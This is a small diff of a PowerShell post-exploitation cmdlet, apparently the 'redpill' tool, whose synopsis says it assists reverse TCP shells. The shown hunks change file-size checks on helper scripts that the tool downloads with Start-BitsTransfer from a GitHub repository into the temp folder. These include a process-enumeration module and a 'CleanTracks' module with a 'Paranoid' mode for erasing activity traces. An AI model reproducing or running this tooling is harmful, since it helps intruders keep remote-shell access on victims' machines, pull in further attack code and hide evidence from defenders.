@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
    CmdLet to assiste reverse tcp shells in post-exploitation
 
@@ -651,7 +651,7 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill" -or $GetProcess -ieq "Tok
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetProcess.ps1 -Destination $Env:TMP\GetProcess.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetProcess.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 9){## Corrupted download detected => DefaultFileSize: 9,5126953125/KB
+      If($SizeDump -lt 9){## Corrupted download detected => DefaultFileSize: 9,6572265625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetProcess.ps1"){Remove-Item -Path "$Env:TMP\GetProcess.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2098,7 +2098,7 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1 -Destination $Env:TMP\CleanTracks.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\CleanTracks.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 18){## Corrupted download detected => DefaultFileSize: 18,8701171875/KB
+      If($SizeDump -lt 20){## Corrupted download detected => DefaultFileSize: 20,1494140625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\CleanTracks.ps1"){Remove-Item -Path "$Env:TMP\CleanTracks.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -6367,5 +6367,3 @@ $HelpParameters = @"
 "@;
 Write-Host "$HelpParameters"
 }
-
-
